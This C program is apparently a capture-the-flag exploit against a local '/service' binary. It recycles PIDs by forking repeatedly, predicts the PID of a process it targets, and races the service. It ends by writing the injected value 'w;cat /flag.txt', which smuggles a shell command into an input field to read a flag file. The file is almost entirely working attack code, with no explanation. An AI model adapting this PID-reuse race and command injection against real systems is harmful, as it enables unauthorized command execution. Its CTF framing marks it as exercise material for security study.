#define _GNU_SOURCE
#include <err.h>
#include <errno.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/prctl.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

#define CHECK(x) ({                                     \
    __typeof__(x) _x = (x);                             \
    if (_x == -1) {                                     \
        err(1, "error at %s (line %d)", #x, __LINE__);  \
    }                                                   \
    _x;                                                 \
})

static void readn(int fd, char* buf, size_t n) {
    size_t i = 0;
    while (i < n) {
        ssize_t x = read(fd, buf + i, n - i);
        if (x < 0) {
            if (errno == EINTR || errno == EAGAIN || errno == EWOULDBLOCK) {
                continue;
            }
            err(1, "read");
        } else if (x == 0) {
            errx(1, "read waaat");
        }
        i += x;
    }
}

static void writen(int fd, const char* buf, size_t n) {
    size_t i = 0;
    while (i < n) {
        ssize_t x = write(fd, buf + i, n - i);
        if (x < 0) {
            if (errno == EINTR || errno == EAGAIN || errno == EWOULDBLOCK) {
                continue;
            }
            err(1, "write");
        } else if (x == 0) {
            errx(1, "write waaat");
        }
        i += x;
    }
}

static void write_str(int fd, const char* str) {
    writen(fd, str, strlen(str));
}

//static size_t g_wait_counter = 0;
//
//static void waitall(void) {
//    while (g_wait_counter--) {
//        wait(NULL);
//    }
//}

static void disable_zombies(void) {
    struct sigaction sa = {
        .sa_handler = SIG_DFL,
        .sa_flags = SA_NOCLDWAIT,
    };
    CHECK(sigaction(SIGCHLD, &sa, NULL));
}

int main(void) {
    setbuf(stdout, NULL);

    int fd = CHECK(open("a", O_RDONLY));
    struct stat statbuf;
    CHECK(fstat(fd, &statbuf));
    size_t f_size = statbuf.st_size;
    char* f_buf = malloc(f_size);
    if (!f_buf) {
        err(1, "OOM");
    }
    readn(fd, f_buf, f_size);
    CHECK(close(fd));

    int p[2];
    CHECK(pipe(p));

    CHECK(dup2(p[0], 1001));
    CHECK(close(p[0]));

    int fds[2];
    CHECK(pipe(fds));

    pid_t pid;
    // recyccle some pids
    for (size_t i = 0; i < 1000; i++) {
        pid = CHECK(fork());
        if (pid == 0) {
            return 0;
        }
        wait(NULL);
    }

    pid = CHECK(fork());
    if (pid == 0) {
        CHECK(close(p[1]));

        CHECK(dup2(fds[0], 0));
        CHECK(close(fds[0]));
        CHECK(close(fds[1]));

        CHECK(prctl(PR_SET_CHILD_SUBREAPER, 1));
        CHECK(execl("/service", "service", NULL));
        return 1;
    }

    CHECK(close(1001));
    CHECK(close(fds[0]));

    write_str(fds[1], "1\n1\na");

    pid_t target_pid = pid + 1;
    printf("target_pid: %d\n", target_pid);

    sleep(1);

    disable_zombies();

    while (1) {
        pid = fork();
        if (pid < 0) {
            if (errno == EAGAIN) {
                //puts("Waiting... ");
                //waitall();
                //puts("done!");
                continue;
            }
            err(1, "fork");
        } else if (pid == 0) {
            return 0;
        }
        //g_wait_counter++;

        if (pid == target_pid - 7) {
            break;
        }
        if (pid % 1000 == 0) {
            printf("%d\n", pid);
        }
    }

    write_str(fds[1], "1\n");
    char size_buf[0x40] = { 0 };
    sprintf(size_buf, "%lu\n", f_size);
    write_str(fds[1], size_buf);
    writen(fds[1], f_buf, f_size);

    sleep(1);

    write_str(fds[1], "1\n20\n");
    writen(fds[1], "w;cat /flag.txt", 16);

    sleep(5);

    write(p[1], "x", 1);

    sleep(5);

    return 0;
}
